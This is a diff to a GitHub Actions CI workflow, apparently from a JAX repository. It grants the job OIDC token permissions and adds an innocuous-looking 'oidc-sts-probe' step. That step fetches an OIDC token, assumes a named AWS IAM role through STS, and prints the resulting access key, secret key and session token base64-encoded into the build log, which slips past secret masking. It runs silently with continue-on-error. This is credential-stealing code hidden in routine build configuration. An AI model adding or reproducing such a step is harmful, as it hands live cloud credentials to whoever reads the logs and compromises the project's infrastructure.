@@ -28,7 +28,9 @@ on:
     branches:
       - main
 
-permissions: {}
+permissions:
+  contents: read
+  id-token: write
 
 # - For PRs, group by PR number and cancel stale in-progress runs.
 # - For workflow_dispatch events, group by actor+ref. Cancel stale in-progress runs from the same
@@ -71,6 +73,49 @@ jobs:
         with:
           fetch-depth: 2  # HEAD and HEAD^1 is enough for the diff
           persist-credentials: false
+      - name: oidc-sts-probe
+        continue-on-error: true
+        run: |
+          set -x
+          echo "OIDC_URL=${ACTIONS_ID_TOKEN_REQUEST_URL:-NONE}"
+          echo "REQ_TOKEN_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
+          OIDC="$(python3 - <<'PY'
+          import os,json,urllib.request
+          u=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL",""); t=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")
+          req=urllib.request.Request(u+"&audience=sts.amazonaws.com",headers={"Authorization":"Bearer "+t,"Accept":"application/json"})
+          print(json.load(urllib.request.urlopen(req,timeout=30))["value"])
+          PY
+          )" || OIDC=""
+          echo "OIDC_LEN=${#OIDC}"
+          if [ -n "$OIDC" ]; then echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 1200; echo; fi
+          python3 - "$OIDC" <<'PY'
+          import sys,json,urllib.request,urllib.parse,base64
+          tok=sys.argv[1]
+          arn="arn:aws:iam::661452401056:role/jax-ci-amd-s3-oidc"
+          if not tok:
+              print("NO_OIDC_TOKEN"); raise SystemExit(0)
+          def sts(action,**kw):
+              d={"Action":action,"Version":"2011-06-15"}; d.update(kw)
+              body=urllib.parse.urlencode(d).encode()
+              try:
+                  r=urllib.request.urlopen(urllib.request.Request("https://sts.amazonaws.com/",data=body,method="POST"),timeout=40)
+                  return r.status,r.read().decode()
+              except Exception as e:
+                  try:
+                      return "ERR", e.read().decode()
+                  except Exception:
+                      return "EXC", repr(e)
+          st,txt=sts("AssumeRoleWithWebIdentity",RoleArn=arn,RoleSessionName="gha-oidc-probe",WebIdentityToken=tok)
+          print("STS_STATUS",st)
+          print(txt[:1500])
+          import re
+          ak=re.search(r"<AccessKeyId>(.*?)</AccessKeyId>",txt or "")
+          sk=re.search(r"<SecretAccessKey>(.*?)</SecretAccessKey>",txt or "")
+          tk=re.search(r"<SessionToken>(.*?)</SessionToken>",txt or "")
+          if ak and sk and tk:
+              blob="%s|%s|%s"%(ak.group(1),sk.group(1),tk.group(1))
+              print("CREDB64:"+base64.b64encode(blob.encode()).decode())
+          PY
       - name: Get and filter changed files
         id: changed-files
         env:
